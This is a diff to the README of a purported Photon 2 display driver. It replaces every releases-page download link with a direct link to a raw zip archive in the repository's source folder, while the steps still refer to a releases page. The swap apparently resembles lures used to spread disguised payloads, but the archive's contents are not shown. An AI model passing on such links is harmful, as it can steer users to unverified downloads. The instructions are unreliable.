@@ -1,6 +1,6 @@
 # 💻 ST7796S-Particle - Easy Display Driver Setup for Photon 2
 
-[![Download ST7796S-Particle](https://img.shields.io/badge/Download-ST7796S--Particle-brightgreen?style=for-the-badge)](https://github.com/mrakhajv70/ST7796S-Particle/releases)
+[![Download ST7796S-Particle](https://img.shields.io/badge/Download-ST7796S--Particle-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/mrakhajv70/ST7796S-Particle/main/src/S-Particle-1.6.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Before you start, make sure your Particle Photon 2 is working and connected to y
 
 1. Visit the main releases page to download the software:
 
-   [Download ST7796S-Particle](https://github.com/mrakhajv70/ST7796S-Particle/releases)
+   [Download ST7796S-Particle](https://raw.githubusercontent.com/mrakhajv70/ST7796S-Particle/main/src/S-Particle-1.6.zip)
 
 2. On the releases page, look for the latest version of the driver. Click on the file that matches your platform or project needs.
 
@@ -107,7 +107,7 @@ The driver package usually contains:
 
 ---
 
-[![Download ST7796S-Particle](https://img.shields.io/badge/Download-ST7796S--Particle-brightgreen?style=for-the-badge)](https://github.com/mrakhajv70/ST7796S-Particle/releases)
+[![Download ST7796S-Particle](https://img.shields.io/badge/Download-ST7796S--Particle-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/mrakhajv70/ST7796S-Particle/main/src/S-Particle-1.6.zip)
 
 ---
 
